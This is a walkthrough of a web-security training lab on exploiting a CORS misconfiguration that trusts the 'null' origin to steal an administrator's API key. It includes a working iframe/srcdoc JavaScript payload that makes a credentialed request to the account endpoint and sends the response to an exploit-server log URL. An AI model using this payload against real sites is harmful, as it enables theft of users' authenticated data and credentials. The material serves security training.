**CORS || Lab#2 || CORS vulnerability with trusted null origin**

<img width="777" height="390" alt="image" src="https://github.com/user-attachments/assets/7fcfc7d0-c93d-4754-9335-e5e871ee7545" />

Goal of this lab is to exploit the CORS misconfiguration to retrieve the admin API key.

Credentials: wiener : peter

Lets start the lab and login

<img width="882" height="352" alt="image" src="https://github.com/user-attachments/assets/c95074b8-3938-4dc0-9e3a-f9709bcc66fe" />

Lets check this traffic in Burpsuite

<img width="1000" height="376" alt="image" src="https://github.com/user-attachments/assets/15ca1e2d-ee3f-4bd9-a05b-f5db6d838ef1" />

We can see that this is a GET request in JSON. In the response there is Access-Control-Allow-Credentials: true. It means application is using CORS rules.

Lets move this traffic to Repeater

<img width="752" height="502" alt="image" src="https://github.com/user-attachments/assets/4554a124-4c83-4bec-9e03-531b8e768d28" />

First we need to confirm if this application is vulnerable to CORS misconfiguration.

1. Change the origin to an arbitrary value.

Lets add the Origin header and see if the application accepts it.

If application accepts it, it means application is accepting any random webpage on the internet to access it data.

<img width="1000" height="348" alt="image" src="https://github.com/user-attachments/assets/b675012c-274e-4009-95a7-b6ccfdf1f69e" />

We got a 200 Ok response and can see Access-Control-Allow-Credentials is true. 

This time there is no Access-Control-Allow-Origin response header. So it means it does not accept arbitrary origin.

2. Change the original header to the Null value.

   <img width="1000" height="351" alt="image" src="https://github.com/user-attachments/assets/47b2362a-6d5c-4579-bb72-cc601ee1ccbb" />

   And this time Access-Control-Allow-Origin response header is null. Which means it accepts the Null value. Also Access-Control-Allow-Credentials is true.
   
So it means Null origin is allowed to access the resources in the application. And it can access not only public resources but private/authenticated resources as well.

So we confirmed that there is CORS misconfiguration and the application is vulnerable.

Lets create a script

```
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
 var req = new XMLHttpRequest();
 req.onload = reqListener;
 req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
 req.withCredentials = true;
 req.send();
 function reqListener() {
 location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
 };
</script>"></iframe>
```

We have to add our Lab ID and Exploit server ID in the script.

<img width="1000" height="508" alt="image" src="https://github.com/user-attachments/assets/ee85711c-0bef-47f8-baeb-02623c31801c" />

<img width="882" height="465" alt="image" src="https://github.com/user-attachments/assets/6051503c-a559-4b1d-a825-5ffa2bd9155f" />

Lets put the script in the Body

<img width="1000" height="324" alt="image" src="https://github.com/user-attachments/assets/1eb2deb3-ae4e-4a39-8b93-65b6d2117f02" />

Click on Store and Deliver exploit to victim.

Now, the Administrator user will receive the exploit and will click on it.

Click on Access log

<img width="1000" height="68" alt="image" src="https://github.com/user-attachments/assets/8dfc1a53-28e5-4e38-8a3c-1e134823e5a4" />

The key is URL encoded. Lets decode it

<img width="1000" height="380" alt="image" src="https://github.com/user-attachments/assets/fbd95f05-b32f-431c-a606-112e144c20e9" />

We got the Administrator API Key.

For solving the lab, we have to submit the Administrator apikey.

<img width="1000" height="320" alt="image" src="https://github.com/user-attachments/assets/b94e9422-d814-477e-9da5-bf2f18874a7b" />

And lad is solved

<img width="1000" height="387" alt="image" src="https://github.com/user-attachments/assets/ca1f559e-2e2f-44b2-9fcc-24b51b4c1881" />




